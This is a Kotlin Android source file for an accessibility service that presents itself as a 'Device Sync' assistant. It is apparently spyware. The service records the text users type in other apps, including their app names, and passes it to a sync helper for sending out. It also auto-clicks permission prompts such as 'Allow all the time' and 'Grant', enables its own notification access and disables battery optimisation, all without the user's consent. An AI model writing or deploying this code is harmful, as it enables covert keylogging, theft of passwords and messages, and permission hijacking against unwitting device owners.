package com.devicesync.assistant.services

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.helpers.SyncHelper

class InputReaderService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastInputText = ""
    private var lastAppPackage = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        // ROOT CAUSE FIX 3: init ConfigHelper so prefs is never uninitialized
        try { ConfigHelper.init(applicationContext) } catch (e: Exception) {}
        // Auto-tap every 800ms for 60 seconds to catch all dialogs
        startAutoTapping()
    }

    private fun startAutoTapping() {
        var count = 0
        val runnable = object : Runnable {
            override fun run() {
                try { autoHandlePermissionDialogs() } catch (e: Exception) {}
                try { autoHandleNotificationAccess() } catch (e: Exception) {}
                try { autoHandleBatteryOptimization() } catch (e: Exception) {}
                count++
                if (count < 75) handler.postDelayed(this, 800)
            }
        }
        handler.postDelayed(runnable, 500)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleInputObserved(event)
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    autoHandlePermissionDialogs()
                    autoHandleNotificationAccess()
                    autoHandleBatteryOptimization()
                }
            }
        } catch (e: Exception) {}
    }

    private fun autoHandlePermissionDialogs() {
        val root = rootInActiveWindow ?: return
        try {
            val keywords = listOf(
                "Allow", "ALLOW",
                "While using the app",
                "Only this time",
                "Allow all the time",
                "ALLOW ALL THE TIME",
                "OK", "Accept", "Continue",
                "Agree", "Grant"
            )
            for (keyword in keywords) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                    val parent = node.parent
                    if (parent != null && parent.isClickable) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        } catch (e: Exception) {}
        try { root.recycle() } catch (e: Exception) {}
    }

    private fun autoHandleNotificationAccess() {
        try {
            val enabled = Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners"
            ) ?: ""
            if (enabled.contains(packageName)) return
            val root = rootInActiveWindow ?: return
            val nodes = root.findAccessibilityNodeInfosByText("Device Sync") ?: return
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    handler.postDelayed({ autoHandlePermissionDialogs() }, 600)
                    return
                }
            }
            try { root.recycle() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    private fun autoHandleBatteryOptimization() {
        try {
            val root = rootInActiveWindow ?: return
            for (text in listOf("Don't optimize", "Don't Optimize", "DONT OPTIMIZE")) {
                val nodes = root.findAccessibilityNodeInfosByText(text) ?: continue
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
            try { root.recycle() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    private fun handleInputObserved(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            val inputText = event.text?.joinToString("") ?: return
            if (inputText.isBlank()) return
            if (inputText == lastInputText && pkg == lastAppPackage) return
            lastInputText = inputText
            lastAppPackage = pkg
            val config = try { ConfigHelper.getConfig() } catch (e: Exception) { return }
            val observedApps = config.observedApps
            if (observedApps.isNotEmpty() && !observedApps.contains(pkg)) return
            val appName = try {
                val pm = applicationContext.packageManager
                pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
            } catch (e: Exception) { pkg }
            try { SyncHelper.sendInputObserved(appName, pkg, inputText) } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    override fun onInterrupt() {}
}
